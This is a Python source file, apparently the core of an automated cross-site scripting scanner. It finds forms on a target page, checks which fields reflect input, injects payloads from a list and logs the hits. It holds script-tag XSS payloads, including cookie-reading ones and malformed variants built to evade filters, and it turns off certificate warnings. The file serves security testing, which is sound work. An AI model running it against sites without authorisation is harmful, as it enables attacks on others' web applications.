from lib.helper.helper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin,urlparse,parse_qs,urlencode
from lib.helper.Log import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class core:



	@classmethod
	def generate(self,eff):
		FUNCTION=[
			"prompt(5000/200)",
			"alert(6000/3000)",
			"alert(document.cookie)",
			"prompt(document.cookie)",
			"console.log(5000/3000)"
		]
		if eff == 1:
			return "<script/>"+FUNCTION[randint(0,4)]+"<\script\>"

		elif eff == 2:
			return "<\script/>"+FUNCTION[randint(0,4)]+"<\\script>"

		elif eff == 3:
			return "<\script\> "+FUNCTION[randint(0,4)]+"<//script>"

		elif eff == 4:
			return "<script>"+FUNCTION[randint(0,4)]+"<\script/>"

		elif eff == 5:
			return "<script>"+FUNCTION[randint(0,4)]+"<//script>"

		elif eff == 6:
			return "<script>"+FUNCTION[randint(0,4)]+"</script>"

	@classmethod
	def post_method(self,url,body,path):
		bsObj=BeautifulSoup(body,"html.parser")
		forms=bsObj.find_all("form",method=True)
		list="payloads.txt"
		# list=path
		for form in forms:
			try:
				action=form["action"]
				if action.startswith('/') is False:
					# print("success --> "+action)
					# print(url)
					url = urljoin(url,action)
					# print(url)
			except KeyError:
				action=url

			if form["method"].lower().strip() == "post":
				Log.info("Target have form with POST method: "+C+url)
				Log.info("Collecting form input key.....")

				mutable=[]
				keys={}
				doBreak = False
				counter=0
				for key in form.find_all(["input","textarea"]):
					counter+=1
					try:
						if key["type"] == "submit" and key["value"] is not "":
							keys.update({key["name"]:key["value"]})
							mutable.append(key["value"])

						else:
							keys.update({key["name"]:'oopoop'+str(counter)})
					except Exception as e:
						Log.warning("Internal error: "+str(e))

				Log.info("Sending payload to (POST) method to test if reflection exists...")
				# print(url)
				req=requests.post(url,data=keys)
				counter=0
				# print(str(list) +" <------------------------")
				f = open(list, "r")
				for k,v in keys.items():
					if doBreak is True:
						f.seek(1)
						break

					# print(mutable)
					counter+=1
					# print("key is: "+k+" -- value is:"+v)
					if v in req.text:
						Log.warning("Detected Reflection (POST) in < "+ k +" > at "+req.url)

						lineCounter=0
						for p in f:
							lineCounter+=1
							if lineCounter > 15:
								break
							if k in mutable:
								continue
							keys.update({k:p.rstrip()})
							# print("that is the keys",keys)
							req=self.session.post(url,data=keys)
							if p.rstrip().strip() in req.text.strip():
								Log.high("Detected XSS (POST) in < "+ k +" > and value is < " + v +" > at "+url)
								file = open("xss.txt", "a")
								file.write(str(req.url) + " | payload:"+ p.rstrip() +"\n\n")
								file.close()
								# print(keys)
								doBreak = True
								break
							else:
								Log.info("No Reflection Detected (POST) at "+ url)

					else:
						Log.info("No Detected Reflection (POST) in < "+ k +" > at "+req.url)


	@classmethod
	def get_method_form(self,url,body,path):
		bsObj=BeautifulSoup(body,"html.parser")
		forms=bsObj.find_all("form",method=True)
		list="payloads.txt"
		# list=path
		for form in forms:
			try:
				action=form["action"]
				if action.startswith('/') is False:
					# print("success --> "+action)
					# print(url)
					url = urljoin(url,action)
					# print(url)
			except KeyError:
				action=url

			if form["method"].lower().strip() == "get":
				Log.warning("Target have form with GET method: "+C+url)
				Log.info("Collecting form input key.....")

				mutable=[]
				keys={}
				doBreak = False
				counter=0
				for key in form.find_all(["input","textarea"]):
					counter+=1
					try:
						if key["type"] == "submit" and key["value"] is not "":
							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
							keys.update({key["name"]:key["value"]})
							mutable.append(key["value"])

						else:
							# Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload)
							keys.update({key["name"]:'oopoop'+str(counter)})
					except Exception as e:
						Log.info("Internal error: "+str(e))

				Log.info("Sending payload (GET) method...")
				# print(url)
				req=requests.get(url,params=keys)
				counter=0
				# print(str(list) +" <------------------------")
				f = open(list, "r")
				for k,v in keys.items():
					if doBreak is True:
						f.seek(1)
						break

					# print(mutable)
					counter+=1
					# print("key is: "+k+" -- value is:"+v)
					if v in req.text:
						Log.high("Detected Reflection (GET) in < "+ k +" > at "+req.url)
						Log.high("Post data: "+str(keys))

						lineCounter=0
						for p in f:
							lineCounter+=1
							if lineCounter > 15:
								break
							if k in mutable:
								continue
							keys.update({k:p.rstrip()})
							# print("that is the keys",keys)
							req=self.session.get(url,params=keys)
							if p.rstrip().strip() in req.text.strip():
								Log.high("Detected XSS (GET) in < "+ k +" > and value is < " + v +" > at "+url)
								file = open("xss.txt", "a")
								file.write(str(req.url) + " | payload:"+ p.rstrip() +"\n\n")
								file.close()
								# print(keys)
								doBreak = True
								break
							else:
								Log.info("No Reflection Detected (GET) at "+ url)

					else:
						Log.info("Parameter page using (GET) payloads but not 100% yet...")

	# @classmethod
	# def get_method(self,url,body,path):
	# 		# while url[-1] != '=':
	# 		#   url = url[:-1]
	#
	#
	# 		try:
	# 			# payload path
	# 			list = "payloads.txt"
	#
	# 			f = open(list, "r")
	# 			query = urlparse(url).query
	# 			if query != "":
	# 				counter =0
	# 				for p in f:
	# 					if counter <=10:
	# 						counter = counter+1
	# 						payload = p.rstrip()
	# 						alterdURL = url.replace("=", f"={payload}")
	# 						res = requests.get(alterdURL)
	# 						if payload in res.text:
	# 							print('XSS Found   -->', '   ', f"{url}")
	# 							print(f"{url}")
	# 							file = open("xss.txt", "a")
	# 							file.write(url)
	# 							break
	# 						else:
	# 							print('NOT Found   -->', '   ', f"{url}")
	# 					else:
	# 						break
	#
	# 		except Exception as e:
	# 			pass

	

	@classmethod
	def main(self,url,proxy,headers,payload,cookie,list,method=2):

		print(W+"*"*15)
		self.payload=payload
		path=list
		self.session=session(proxy,headers,cookie)
		Log.info("Checking connection to: "+Y+url)	
		try:
			ctr=self.session.get(url)
			body=ctr.text
		except Exception as e:
			Log.high("Internal error: "+str(e))
			return
		
		if ctr.status_code > 400:
			Log.info("Connection failed "+G+str(ctr.status_code))
			return 
		else:
			Log.info("Connection estabilished "+G+str(ctr.status_code))
		
		if method >= 2:
			self.post_method(url,body,path)
			# self.get_method(url,body,path)
			self.get_method_form(url,body,path)
			
		elif method == 1:
			self.post_method(url,body,path)
		elif method == 0:
			self.get_method(url,body,path)
			self.get_method_form(url,body,path)